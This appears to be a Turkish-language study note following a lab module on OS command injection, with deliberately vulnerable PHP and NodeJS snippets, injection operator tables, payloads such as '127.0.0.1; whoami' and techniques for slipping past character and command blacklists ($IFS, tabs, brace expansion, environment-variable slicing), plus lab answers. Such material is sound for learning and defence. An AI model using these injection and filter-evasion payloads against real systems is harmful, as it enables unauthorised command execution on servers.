---
{"dg-publish":true,"permalink":"/web-penters/command-injection/"}
---


### **Komut Enjeksiyonlarına Giriş:**  
**Command Injection** (Komut Enjeksiyonu), en kritik güvenlik açıklarından biridir. Bu açık, saldırganın sistem komutlarını doğrudan backend server üzerinde çalıştırmasına olanak tanır. Bu da server’ın veya tüm ağın ele geçirilmesine yol açabilir. Eğer bir web uygulaması, kullanıcı tarafından sağlanan girdiyi backend üzerinde bir sistem komutunu çalıştırmak için kullanıyorsa, kötü amaçlı bir payload enjeksiyonu ile bu komutlar manipüle edilebilir ve saldırganın kendi komutlarını çalıştırması sağlanabilir.

**Injection Nedir?**  
Injection açıkları, **OWASP Top 10 Web App Risks** listesinde 3. sırada yer alır. Bunun nedeni, hem çok yaygın olmaları hem de etkilerinin ciddi olmasıdır. Injection, kullanıcı girdisinin yanlış yorumlanarak web sorgusunun veya yürütülen kodun bir parçası olarak algılanması sonucu ortaya çıkar. Bu durum, sorgunun orijinal amacını değiştirmek ve saldırganın lehine sonuçlar üretmek için kullanılabilir.

### **Injection Türleri:**

1. **OS Command Injection:** Kullanıcı girdisinin doğrudan bir işletim sistemi (OS) komutunda kullanılması.
2. **Code Injection:** Kullanıcı girdisinin bir kodu değerlendiren bir fonksiyonun içine doğrudan dahil edilmesi.
3. **SQL Injection:** Kullanıcı girdisinin bir **SQL query** içerisinde kullanılması.
4. **Cross-Site Scripting (XSS)/HTML Injection:** Kullanıcı girdisinin web sayfasında doğrudan görüntülenmesi.

### **Diğer Injection Türleri:**  
LDAP Injection, NoSQL Injection, HTTP Header Injection, XPath Injection, IMAP Injection ve ORM Injection gibi türler de vardır. Kullanıcı girdisinin düzgün bir şekilde sanitize edilmeden bir sorguya dahil edilmesi, bu girdinin sorgunun sınırlarını aşmasına ve sorgunun orijinal amacını değiştirmesine olanak tanır. Web teknolojilerinin çeşitlenmesiyle birlikte yeni injection türleri de ortaya çıkmaktadır.


### PHP Örneği
Örneğin, PHP ile yazılmış bir web uygulaması, doğrudan back-end sunucusunda komut çalıştırmak için exec, system, shell_exec, passthru veya popen fonksiyonlarını kullanabilir ve bunların her biri biraz farklı kullanım durumlarına sahiptir. Aşağıdaki kod, komut enjeksiyonlarına karşı savunmasız olan bir PHP kodu örneğidir:

```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

Belki de belirli bir web uygulaması, kullanıcıların /tmp dizininde kullanıcı tarafından sağlanan bir dosya adıyla oluşturulan ve daha sonra web uygulaması tarafından belge işleme amacıyla kullanılabilecek yeni bir .pdf belgesi oluşturmasına olanak tanıyan bir fonksiyona sahiptir. Ancak, GET isteğindeki dosya adı parametresinden gelen kullanıcı girdisi doğrudan touch komutu ile kullanıldığından (önce sterilize edilmeden veya kaçmadan), web uygulaması OS komut enjeksiyonuna karşı savunmasız hale gelir. Bu açık, back-end sunucusunda rastgele sistem komutları çalıştırmak için kullanılabilir.


#### NodeJS Example

Bu sadece PHP'ye özgü bir durum olmayıp, herhangi bir web geliştirme çatısı veya dilinde ortaya çıkabilir. Örneğin, bir web uygulaması NodeJS'de geliştiriliyorsa, bir geliştirici aynı amaç için child_process.exec veya child_process.spawn kullanabilir. Aşağıdaki örnek, yukarıda tartıştıklarımıza benzer bir fonksiyonellik gerçekleştirmektedir:

```javascript
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```


Yukarıdaki kod, GET isteğinden gelen dosya adı parametresini önce sterilize etmeden komutun bir parçası olarak kullandığından, komut enjeksiyonu güvenlik açığına da açıktır. Hem PHP hem de NodeJS web uygulamaları aynı komut enjeksiyon yöntemleri kullanılarak istismar edilebilir.


### **Detection (Tespit)**  
**OS Command Injection** açıkları, genellikle komut ekleyerek tespit edilir. Çıktı normalden farklıysa, açık sömürülmüş demektir. Karmaşık durumlarda **fuzzing** veya kod inceleme ile açıklar belirlenir ve payload geliştirilir. Bu modül, sanitize edilmemiş girdilerle yapılan temel enjeksiyonlara odaklanır.



## Command Injection Detection

Aşağıdaki alıştırmada web uygulamasını ziyaret ettiğimizde, canlı olup olmadığını kontrol etmek için bizden bir IP isteyen bir Host Checker yardımcı programı görüyoruz:

![Pasted image 20241210211643.png](/img/user/resimler/Pasted%20image%2020241210211643.png)

Fonksiyonelliği kontrol etmek için 127.0.0.1 localhost IP adresini girmeyi deneyebiliriz ve beklendiği gibi ping komutunun çıktısı bize localhost'un gerçekten canlı olduğunu söyler

![Pasted image 20241210211707.png](/img/user/resimler/Pasted%20image%2020241210211707.png)


Her ne kadar web uygulamasının kaynak koduna erişimimiz olmasa da, aldığımız çıktıdan girdiğimiz IP'nin bir ping komutuna girdiğini rahatlıkla tahmin edebiliriz. Sonuç ping komutunda iletilen tek bir paketi gösterdiğine göre kullanılan komut aşağıdaki gibi olabilir:

```bash
ping -c 1 OUR_INPUT
```

Eğer girdimiz ping komutu ile kullanılmadan önce sanitize edilmez ve escaped edilmezse, başka bir keyfi komut enjekte edebiliriz.


## Command Injection Methods
Amaçlanan komuta ek bir komut eklemek için aşağıdaki operatörlerden herhangi birini kullanabiliriz:

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|`                    | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                          |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |

Bu operatörlerden herhangi birini başka bir komutu enjekte etmek için kullanabiliriz, böylece komutların her ikisi veya biri yürütülür. Beklenen girdimizi (örneğin bir IP) yazar, ardından yukarıdaki operatörlerden herhangi birini kullanır ve ardından yeni komutumuzu yazarız.

İpucu: Yukarıdakilere ek olarak, Linux ve macOS'ta çalışacak, ancak Windows'ta çalışmayacak, enjekte edilen komutumuzu çift ters işaretlerle ('') veya bir sub-shell operatörüyle ($()) sarmak gibi sadece unix'e özgü birkaç operatör vardır.

Genel olarak, temel komut enjeksiyonu için, bu operatörlerin tümü web uygulaması dili, framework veya back-end sunucusundan bağımsız olarak komut enjeksiyonları için kullanılabilir. Yani, Linux sunucusunda çalışan bir PHP web uygulamasına veya Windows back-end sunucusunda çalışan bir .Net web uygulamasına veya macOS back-end sunucusunda çalışan bir NodeJS web uygulamasına komut enjekte ediyorsak, enjeksiyonlarımız ne olursa olsun çalışmalıdır.

Not: Tek istisna, komut Windows Komut Satırı (CMD) ile çalıştırılıyorsa çalışmayacak, ancak Windows PowerShell ile çalıştırılıyorsa yine de çalışacak olan noktalı virgül ; olabilir.

Bir sonraki bölümde, Host Checker alıştırmasını exploit etmek için yukarıdaki enjeksiyon operatörlerinden birini kullanmaya çalışacağız.


Soru 1: IP alanındaki ip'den sonra enjeksiyon operatörlerinden herhangi birini eklemeyi deneyin. Hata mesajı ne diyordu (İngilizce)?

cevap : 

![Pasted image 20241210212715.png](/img/user/resimler/Pasted%20image%2020241210212715.png)


### Komutları Enjekte Etme
Şimdiye kadar Host Checker web uygulamasının komut enjeksiyonlarına karşı potansiyel olarak savunmasız olduğunu tespit ettik ve web uygulamasını istismar etmek için kullanabileceğimiz çeşitli enjeksiyon yöntemlerini tartıştık. Şimdi, komut enjeksiyonu girişimlerimize noktalı virgül operatörü (;) ile başlayalım.

```bash
ping -c 1 127.0.0.1; whoami
```

![Pasted image 20241210213014.png](/img/user/resimler/Pasted%20image%2020241210213014.png)

Gördüğümüz gibi, web uygulaması girdimizi reddetti, çünkü yalnızca IP biçiminde girdi kabul ediyor gibi görünüyor. Ancak, hata mesajına bakılırsa, back-end'den ziyade front-end'den kaynaklanıyor gibi görünüyor. Network sekmesini göstermek için [CTRL + SHIFT + E] tuşlarına tıklayarak ve ardından Check düğmesine tekrar tıklayarak Firefox Developer Tools ile bunu iki kez kontrol edebiliriz:

![Pasted image 20241210213044.png](/img/user/resimler/Pasted%20image%2020241210213044.png)

Gördüğümüz gibi, Check düğmesine tıkladığımızda yeni bir ağ isteği yapılmadı, ancak bir hata mesajı aldık. Bu, kullanıcı girişi doğrulamasının front-end'de gerçekleştiğini gösterir.


### Front-End Doğrulamasını Atlama (Burp POST İsteği)

![Pasted image 20241210213220.png](/img/user/resimler/Pasted%20image%2020241210213220.png)

Şimdi HTTP isteğimizi özelleştirebilir ve web uygulamasının bunu nasıl ele aldığını görmek için gönderebiliriz. Aynı önceki payload'u (127.0.0.1; whoami) kullanarak başlayacağız. Ayrıca, istediğimiz gibi gönderildiğinden emin olmak için payload'umuzu URL-encode etmeliyiz. Bunu yükü seçip [CTRL + U] tuşlarına tıklayarak yapabiliriz. Son olarak, HTTP isteğimizi göndermek için Gönder'e tıklayabiliriz:



#### Burp POST Request

![Pasted image 20241210213349.png](/img/user/resimler/Pasted%20image%2020241210213349.png)

Gördüğümüz gibi, bu sefer aldığımız yanıt ping komutunun çıktısını ve whoami komutunun sonucunu içeriyor, yani yeni komutumuzu başarıyla enjekte ettik.


Front-end giriş doğrulamasının nerede gerçekleştiğini bulmak için sayfanın HTML kaynak kodunu inceleyin. Hangi satır numarasında?

Cevap : 17

![Pasted image 20241210213536.png](/img/user/resimler/Pasted%20image%2020241210213536.png)



# Other Injection Operators

### AND Operator
AND (&&) operatörü ile başlayabiliriz, böylece son payloadumuz (127.0.0.1 && whoami) olur ve son çalıştırılan komut aşağıdaki gibi olur:

```bash
ping -c 1 127.0.0.1 && whoami
```

Her zaman yapmamız gerektiği gibi, çalışan bir komut olduğundan emin olmak için önce Linux VM'mizde komutu çalıştırmayı deneyelim:

```shell-session
21y4d@htb[/htb]$ ping -c 1 127.0.0.1 && whoami

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=1.03 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1.034/1.034/1.034/0.000 ms
21y4d
```

Gördüğümüz gibi, komut çalışıyor ve daha önce aldığımız çıktının aynısını alıyoruz. Önceki bölümdeki enjeksiyon operatörleri tablosuna bakmayı deneyin ve && operatörünün nasıl farklı olduğunu görün (eğer bir IP yazmazsak ve doğrudan && ile başlarsak, komut yine de çalışır mı?)

Şimdi, payload'umuzu kopyalayarak, Burp Suite'teki HTTP isteğimize yapıştırarak, URL kodlayarak ve son olarak göndererek daha önce yaptığımızın aynısını yapabiliriz:

![Pasted image 20241210220812.png](/img/user/resimler/Pasted%20image%2020241210220812.png)

Gördüğümüz gibi, komutumuzu başarıyla enjekte ettik ve her iki komutun da beklenen çıktısını aldık.


## OR Operator

Son olarak, OR (||) enjeksiyon operatörünü deneyelim. OR operatörü yalnızca ilk komutun çalışmaması durumunda ikinci komutu çalıştırır. Bu, her iki komutun da çalışmasını sağlamanın sağlam bir yolu olmadan enjeksiyonumuzun orijinal komutu bozacağı durumlarda bizim için yararlı olabilir. Dolayısıyla, OR operatörünü kullanmak, ilk komutun başarısız olması halinde yeni komutumuzun çalışmasını sağlayacaktır.

Normal payload'umuzu || operatörü ile kullanmaya çalışırsak (127.0.0.1 || whoami), sadece ilk komutun çalışacağını görürüz:

```shell-session
21y4d@htb[/htb]$ ping -c 1 127.0.0.1 || whoami

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.635 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.635/0.635/0.635/0.000 ms
```

Bunun nedeni bash komutlarının çalışma şeklidir. İlk komut başarılı bir şekilde yürütüldüğünü gösteren çıkış kodu 0'ı döndürdüğünde, bash komutu durur ve diğer komutu denemez. Yalnızca ilk komut başarısız olursa ve çıkış kodu 1 döndürürse diğer komutu çalıştırmayı deneyecektir.

HTTP isteğinde yukarıdaki payload'u kullanmayı deneyin ve web uygulamasının bunu nasıl ele aldığını görün.

İlk komutu bir IP sağlamayarak ve doğrudan || operatörünü (|| whoami) kullanarak kasıtlı olarak bozmayı deneyelim, böylece ping komutu başarısız olur ve enjekte edilen komutumuz çalıştırılır:


```shell-session
21y4d@htb[/htb]$ ping -c 1 || whoami

ping: usage error: Destination address required
21y4d
```

Gördüğümüz gibi, ping komutu başarısız olduktan ve bize bir hata mesajı verdikten sonra bu sefer whoami komutu çalıştı. Şimdi HTTP isteğimizdeki (|| whoami) payload'unu deneyelim:

![Pasted image 20241210220945.png](/img/user/resimler/Pasted%20image%2020241210220945.png)

Bu sefer beklendiği gibi sadece ikinci komutun çıktısını aldığımızı görüyoruz. Bununla, çok daha basit bir payload kullanıyoruz ve çok daha temiz bir sonuç elde ediyoruz.

Bu tür operatörler SQL enjeksiyonları, LDAP enjeksiyonları, XSS, SSRF, XML vb. gibi çeşitli enjeksiyon türleri için kullanılabilir. Enjeksiyonlar için kullanılabilecek en yaygın operatörlerin bir listesini oluşturduk:

| **Injection Type**                      | **Operators**                                     |
| --------------------------------------- | ------------------------------------------------- |
| SQL Injection                           | `'` `,` `;` `--` `/* */`                          |
| Command Injection                       | `;` `&&`                                          |
| LDAP Injection                          | `*` `(` `)` `&` `\|`                              |
| XPath Injection                         | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection                    | `;` `&` `\|`                                      |
| Code Injection                          | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`  |
| Directory Traversal/File Path Traversal | `../` `..\\` `%00`                                |
| Object Injection                        | `;` `&` `\|`                                      |
| XQuery Injection                        | `'` `;` `--` `/* */`                              |
| Shellcode Injection                     | `\x` `\u` `%u` `%n`                               |
| Header Injection                        | `\n` `\r\n` `\t` `%0d` `%0a` `%09`                |

Bu tablonun eksik olduğunu ve başka birçok seçenek ve operatörün mümkün olduğunu unutmayın. Ayrıca büyük ölçüde çalıştığımız ve test ettiğimiz ortama da bağlıdır.

Bu tablonun eksik olduğunu ve başka birçok seçenek ve operatörün mümkün olduğunu unutmayın. Ayrıca büyük ölçüde çalıştığımız ve test ettiğimiz ortama da bağlıdır.

Bu modülde, esas olarak girdimizin doğrudan sistem komutuna gittiği ve komutun çıktısını aldığımız doğrudan komut enjeksiyonları ile ilgileniyoruz. Dolaylı enjeksiyonlar veya blind injection gibi gelişmiş komut enjeksiyonları hakkında daha fazla bilgi için, gelişmiş enjeksiyon yöntemlerini ve diğer birçok konuyu kapsayan Whitebox Pentesting 101: Command Injection modülüne başvurabilirsiniz.


Soru : Kalan üç enjeksiyon operatörünü (new-line, &, |) kullanmayı deneyin ve her birinin nasıl çalıştığını ve çıktının nasıl farklılaştığını görün. Hangisi yalnızca enjekte edilen komutun çıktısını gösterir?

Cevap : | 

![Pasted image 20241210221419.png](/img/user/resimler/Pasted%20image%2020241210221419.png)

![Pasted image 20241210221515.png](/img/user/resimler/Pasted%20image%2020241210221515.png)

![Pasted image 20241210221633.png](/img/user/resimler/Pasted%20image%2020241210221633.png)



## Filter/WAF Detection

İstismar ettiğimiz Host Checker web uygulamasının aynısını görüyoruz, ancak şimdi kolunda birkaç hafifletme var. Test ettiğimiz (;, &&, ||) gibi önceki operatörleri denediğimizde geçersiz girdi hata mesajını aldığımızı görebiliriz:

![Pasted image 20241210221837.png](/img/user/resimler/Pasted%20image%2020241210221837.png)

Bu, gönderdiğimiz bir şeyin, isteğimizi reddeden bir güvenlik mekanizmasını tetiklediğini gösterir. Bu hata mesajı çeşitli şekillerde görüntülenebilir. Bu durumda, çıktının görüntülendiği alanda görüyoruz, bu da PHP web uygulamasının kendisi tarafından tespit edildiği ve engellendiği anlamına geliyor. Hata mesajı, IP'miz ve isteğimiz gibi bilgileri içeren farklı bir sayfa görüntülediyse, bu, bir WAF tarafından reddedildiğini gösterebilir.

Gönderdiğimiz payload'u kontrol edelim:

```bash
127.0.0.1; whoami
```

IP dışında (kara listede olmadığını biliyoruz), gönderdik:

* Noktalı virgül karakteri ;
* Bir boşluk karakteri
* Bir whoami komutu

Yani, web uygulaması ya kara listeye alınmış bir karakter tespit etti ya da kara listeye alınmış bir komut tespit etti veya her ikisini de tespit etti. Şimdi her ikisini de nasıl atlatacağımızı görelim.


## Blacklisted Characters

Bir web uygulaması kara listeye alınmış karakterlerin bir listesine sahip olabilir ve komut bunları içeriyorsa isteği reddeder. PHP kodu aşağıdaki gibi görünebilir:

```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

Gönderdiğimiz string'deki herhangi bir karakter kara listedeki bir karakterle eşleşirse, isteğimiz reddedilir. Filtreyi atlama girişimlerimize başlamadan önce, reddedilen isteğe hangi karakterin neden olduğunu belirlemeye çalışmalıyız.


## Identifying Blacklisted Character

İsteğimizi her seferinde bir karaktere indirgeyelim ve ne zaman engellendiğini görelim. (127.0.0.1) payload'unun çalıştığını biliyoruz, bu yüzden noktalı virgül (127.0.0.1;) ekleyerek başlayalım:

![Pasted image 20241210235207.png](/img/user/resimler/Pasted%20image%2020241210235207.png)

Hala geçersiz girdi hatası alıyoruz, bu da noktalı virgülün kara listede olduğu anlamına geliyor. Öyleyse, daha önce tartıştığımız tüm enjeksiyon operatörlerinin kara listeye alınıp alınmadığını görelim.



Soru : Herhangi birinin kara listeye alınıp alınmadığını görmek için diğer tüm enjeksiyon operatörlerini deneyin. Hangisi (new-line, &, |) web uygulaması tarafından kara listeye alınmamıştır?

Cevap : 

![Pasted image 20241210235753.png](/img/user/resimler/Pasted%20image%2020241210235753.png)

![Pasted image 20241210235835.png](/img/user/resimler/Pasted%20image%2020241210235835.png)

![Pasted image 20241210235903.png](/img/user/resimler/Pasted%20image%2020241210235903.png)

%0a --> \n

![Pasted image 20241211000335.png](/img/user/resimler/Pasted%20image%2020241211000335.png)



## Bypass Blacklisted Operators

Enjeksiyon operatörlerinin çoğunun gerçekten de blacklist’eye alındığını göreceğiz. Bununla birlikte, new-line karakteri genellikle blacklist’e alınmaz, çünkü payload’un kendisinde gerekli olabilir. New-line karakterinin hem Linux’ta hem de Windows’ta komutlarımızı eklemede işe yaradığını biliyoruz, bu yüzden onu enjeksiyon operatörümüz olarak kullanmayı deneyelim:

![Pasted image 20241211000605.png](/img/user/resimler/Pasted%20image%2020241211000605.png)


## Bypass Blacklisted Spaces

Artık çalışan bir enjeksiyon operatörümüz olduğuna göre, orijinal payload’umuzu değiştirelim ve (127.0.0.1%0a whoami) olarak tekrar gönderelim:

![Pasted image 20241211000637.png](/img/user/resimler/Pasted%20image%2020241211000637.png)

Gördüğümüz gibi, hala bir invalid input hata mesajı alıyoruz, bu da hala atlamamız gereken başka filtreler olduğu anlamına geliyor. Bu nedenle, daha önce yaptığımız gibi, yalnızca bir sonraki karakteri (boşluk olan) ekleyelim ve bunun reddedilen isteğe neden olup olmadığını görelim:

![Pasted image 20241211000652.png](/img/user/resimler/Pasted%20image%2020241211000652.png)

Gördüğümüz gibi, boşluk karakteri de gerçekten blacklist’e alınmış.Yine de, boşluk karakterini gerçekten kullanmadan boşluk karakteri eklemenin birçok yolu vardır!


## Using Tabs

Boşluk yerine sekme (%09) kullanmak işe yarayabilecek bir tekniktir, çünkü hem Linux hem de Windows argümanlar arasında tab olan komutları kabul eder ve aynı şekilde çalıştırılırlar. Öyleyse, boşluk karakteri yerine bir tab kullanmayı deneyelim (127.0.0.1%0a%09) ve isteğimizin kabul edilip edilmediğini görelim:

 ![Pasted image 20241211000724.png](/img/user/resimler/Pasted%20image%2020241211000724.png)

Gördüğümüz gibi, bunun yerine bir tab kullanarak boşluk karakteri filtresini başarıyla atladık. Boşluk karakterlerini değiştirmenin başka bir yöntemini görelim.


## Using $IFS
($IFS) Linux Ortam Değişkenini kullanmak da işe yarayabilir, çünkü varsayılan değeri komut argümanları arasında çalışacak bir boşluk ve bir sekmedir. Yani, eğer ${IFS} kullanırsak boşlukların olması gereken yerde, değişken otomatik olarak bir boşlukla değiştirilmeli ve komutumuz çalışmalıdır.

`${IFS} kullanalım ve çalışıp çalışmadığına bakın (127.0.0.1%0a${IFS}):`

![Pasted image 20241211001354.png](/img/user/resimler/Pasted%20image%2020241211001354.png)

Talebimizin bu kez reddedilmediğini ve boşluk filtresini yine atladığımızı görüyoruz.


## Brace Genişlemesini Kullanma

Boşluk filtrelerini atlamak için kullanabileceğimiz başka birçok yöntem vardır. Örneğin, parantezler arasına sarılmış argümanlar arasına otomatik olarak boşluk ekleyen Bash Brace Expansion özelliğini aşağıdaki gibi kullanabiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ {ls,-la}

total 0
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 07:37 .
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 13:01 ..
```

Gördüğümüz gibi, komut içinde boşluk olmadan başarıyla çalıştırıldı. Aynı yöntemi, komut argümanlarımızda (127.0.0.1%0a{ls,-la}) gibi parantez genişletmesi kullanarak komut enjeksiyon filtresi atlamalarında da kullanabiliriz. Daha fazla boşluk filtresi atlatma yöntemi keşfetmek için boşluksuz komut yazma hakkındaki PayloadsAllTheThings sayfasına göz atın.


Soru : Bu bölümde öğrendiklerinizi 'ls -la' komutunu çalıştırmak için kullanın. 'index.php' dosyasının boyutu nedir?
cevap : 

1- Öncelikle new-line ‘nın çalışığ çalışmadığını tespit edelim .
![Pasted image 20241211005743.png](/img/user/resimler/Pasted%20image%2020241211005743.png)

2- New-line çalışıyor. Şimdi $IFS ‘in çalışıp çalımadığını kontrol edelim .

![Pasted image 20241211005752.png](/img/user/resimler/Pasted%20image%2020241211005752.png)

3- $IFS ‘inde çalıştığını görüyoruz . Son olarak ls -la komutunu $IFS içine yazalım ve cevabımızı bulalım .

![Pasted image 20241211005802.png](/img/user/resimler/Pasted%20image%2020241211005802.png)


## Diğer Blaclist Karakterleri Atlama

Enjeksiyon operatörleri ve boşluk karakterlerinin yanı sıra, Linux veya Windows’ta dizinleri belirtmek için gerekli olduğu için çok yaygın olarak blacklist’e alınan bir karakter eğik çizgi (/) veya ters eğik çizgi (\) karakteridir. Blacklist karakterlerini kullanmaktan kaçınırken istediğimiz karakteri üretmek için çeşitli teknikler kullanabiliriz.


## Linux

Payload’umuzda eğik çizgiler bulundurmak için kullanabileceğimiz birçok teknik vardır. Eğik çizgileri (veya başka herhangi bir karakteri) değiştirmek için kullanabileceğimiz tekniklerden biri ${IFS} ile yaptığımız gibi Linux Ortam Değişkenleridir. Bununla birlikte ${IFS} doğrudan bir boşlukla değiştirilir, eğik çizgiler veya noktalı virgüller için böyle bir ortam değişkeni yoktur. Bununla birlikte, bu karakterler bir ortam değişkeninde kullanılabilir ve dizgimizin başlangıcını ve uzunluğunu bu karakterle tam olarak eşleşecek şekilde belirleyebiliriz.

Örneğin, Linux’ta $PATH ortam değişkenine bakarsak, aşağıdaki gibi bir şey görünebilir:

```shell-session
M1R4CKCK@htb[/htb]$ echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```

Dolayısıyla, 0 karakterinden başlarsak ve yalnızca 1 uzunluğunda bir string alırsak, payload'umuzda kullanabileceğimiz yalnızca / karakterini elde ederiz:

```shell-session
M1R4CKCK@htb[/htb]$ echo ${PATH:0:1}

/
```

Not: Yukarıdaki komutu payload’umuzda kullandığımızda, echo eklemeyeceğiz, çünkü bu durumda sadece çıktılanan karakteri göstermek için kullanıyoruz.

Aynı şeyi $HOME veya $PWD ortam değişkenleri için de yapabiliriz. Aynı kavramı, enjeksiyon operatörü olarak kullanılmak üzere noktalı virgül karakteri elde etmek için de kullanabiliriz. Örneğin, aşağıdaki komut bize bir noktalı virgül verir:

```shell-session
M1R4CKCK@htb[/htb]$ echo ${LS_COLORS:10:1}

;
```

İpucu: printenv komutu Linux’taki tüm ortam değişkenlerini yazdırır, böylece hangilerinin yararlı karakterler içerebileceğine bakabilir ve ardından dizeyi yalnızca bu karaktere indirgemeye çalışabilirsiniz.


![Pasted image 20241211012550.png](/img/user/resimler/Pasted%20image%2020241211012550.png)

Şimdi, ortam değişkenlerini kullanarak payload’umuza noktalı virgül ve boşluk ekleyelim `(127.0.0.1${LS_COLORS:10:1}${IFS})` ve filtreyi atlatıp atlatamayacağımıza bakalım:

![Pasted image 20241211012626.png](/img/user/resimler/Pasted%20image%2020241211012626.png)


## Windows

Aynı kavram Windows üzerinde de çalışır. Örneğin, Windows Komut Satırında (CMD) bir eğik çizgi üretmek için, bir Windows değişkenini (%HOMEPATH% -> \Users\htb-student) yankılayabilir ve ardından bir başlangıç konumu (~6 -> \htb-student) ve son olarak negatif bir bitiş konumu belirtebiliriz, bu durumda htb-student kullanıcı adının uzunluğu (-11 -> \) :

```cmd-session
C:\htb> echo %HOMEPATH:~6,-11%

\
```

Windows PowerShell’de aynı değişkenleri kullanarak aynı şeyi başarabiliriz. PowerShell’de bir word bir dizi olarak kabul edilir, bu nedenle ihtiyacımız olan karakterin indeksini belirtmemiz gerekir. Yalnızca bir karaktere ihtiyacımız olduğundan, başlangıç ve bitiş konumlarını belirtmemiz gerekmez:

```powershell-session
PS C:\htb> $env:HOMEPATH[0]

\


PS C:\htb> $env:PROGRAMFILES[10]
PS C:\htb>
```

Ayrıca Get-ChildItem Env: PowerShell komutunu kullanarak tüm ortam değişkenlerini yazdırabilir ve ardından ihtiyacımız olan karakteri üretmek için bunlardan birini seçebiliriz. Yaratıcı olmaya çalışın ve benzer karakterler üretmek için farklı komutlar bulun.


```powershell-session
PS C:\Users\assem> Get-ChildItem Env:  
  
Name Value  
---- -----  
ALLUSERSPROFILE C:\ProgramData  
APPDATA C:\Users\assem\AppData\Roaming  
CommonProgramFiles C:\Program Files\Common Files  
CommonProgramFiles(x86) C:\Program Files (x86)\Common Files  
CommonProgramW6432 C:\Program Files\Common Files  
COMPUTERNAME DESKTOP-RJ644SA  
ComSpec C:\Windows\system32\cmd.exe  
DriverData C:\Windows\System32\Drivers\DriverData  
HOMEDRIVE C:  
HOMEPATH \Users\assem  
LOCALAPPDATA C:\Users\assem\AppData\Local  
LOGONSERVER \\DESKTOP-RJ644SA  
NUMBER_OF_PROCESSORS 8  
OneDrive C:\Users\assem\OneDrive  
..SNIP..
```

## Karakter Değiştirme

Gerekli karakterleri kullanmadan üretmek için karakter kaydırma gibi başka teknikler de vardır. Örneğin, aşağıdaki Linux komutu verdiğimiz karakteri 1 kaydırır. Bu yüzden, tek yapmamız gereken ASCII tablosunda ihtiyacımız olan karakterden hemen önceki karakteri bulmak (man ascii ile bulabiliriz) ve aşağıdaki örnekte `[` yerine eklemektir. Bu şekilde, yazdırılan son karakter ihtiyacımız olan karakter olacaktır:

```shell-session
M1R4CKCK@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
M1R4CKCK@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)

\
```

Windows’ta aynı sonucu elde etmek için PowerShell komutlarını kullanabiliriz, ancak bunlar Linux’takilerden oldukça uzun olabilir.


Soru : ‘/home’ klasöründeki kullanıcının adını bulmak için bu bölümde öğrendiklerinizi kullanın. Hangi kullanıcıyı buldunuz?

Cevap :

1- new-line’nın çalışıp çalışmadığını kontrol edelim .

![Pasted image 20241211020625.png](/img/user/resimler/Pasted%20image%2020241211020625.png)

2- new-line çalışıyor . $IFS ‘in çalışıp çalışmadığını kontrol edelim .

![Pasted image 20241211020638.png](/img/user/resimler/Pasted%20image%2020241211020638.png)

3- new-line ve $IFS çalışıyor. Soruyu çözmek ls komutu ile /home klasörünü görmemiz lazım . Önceki bölümde ls komutu çalıştırmaya çalışalım .

![Pasted image 20241211022739.png](/img/user/resimler/Pasted%20image%2020241211022739.png)


4- Gördüğümüz gibi çalışıyor kalan ifadeler /home dizinini yazdırmak .

/ ifadesi → `echo ${PATH:0:1} ile`

yazdırabiliriz.

![Pasted image 20241211022837.png](/img/user/resimler/Pasted%20image%2020241211022837.png)


## Blacklisted Komutları Atlama

Tek karakterli filtreleri atlamak için çeşitli yöntemlerden bahsettik. Ancak, blacklist’e alınmış komutları atlamak söz konusu olduğunda farklı yöntemler vardır. Bir komut blacklist’eye genellikle bir dizi kelimeden oluşur ve eğer komutlarımızı gizleyebilir ve farklı görünmelerini sağlayabilirsek, filtreleri atlatabiliriz.

Komut gizleme araçlarına daha sonra değineceğimiz gibi, karmaşıklık derecesine göre değişen çeşitli komut gizleme yöntemleri vardır. Filtreleri manuel olarak atlatmak için komutumuzun görünümünü değiştirmemizi sağlayabilecek birkaç temel tekniği ele alacağız.


## Commands Blacklist

Şu ana kadar payload’umuzdaki boşluk ve noktalı virgül karakterleri için karakter filtresini başarıyla atlattık. Şimdi, ilk payload’umuza geri dönelim ve whoami komutunu yeniden ekleyerek çalıştırılıp çalıştırılmadığını görelim:

![Pasted image 20241211023123.png](/img/user/resimler/Pasted%20image%2020241211023123.png)

Web uygulaması tarafından engellenmeyen karakterler kullanmamıza rağmen, komutumuzu ekledikten sonra isteğin tekrar engellendiğini görüyoruz. Bunun nedeni büyük olasılıkla başka bir filtre türü olan komut blacklist filtresidir.

PHP’deki temel bir komut blacklist filtresi aşağıdaki gibi görünecektir:

```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

